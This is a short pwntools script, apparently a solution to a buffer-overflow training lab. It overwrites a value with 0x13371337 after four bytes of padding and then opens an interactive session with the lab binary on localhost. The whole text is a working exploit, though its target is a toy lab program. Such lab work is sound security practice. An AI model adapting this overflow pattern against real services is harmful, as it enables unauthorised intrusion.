from pwn import *

local = False
r = process("./pwn_lab_0x00_bof") if local else remote("localhost", 42013)
p = b"a" * 4 + p32(0x13371337)

r.sendline(p)
r.interactive()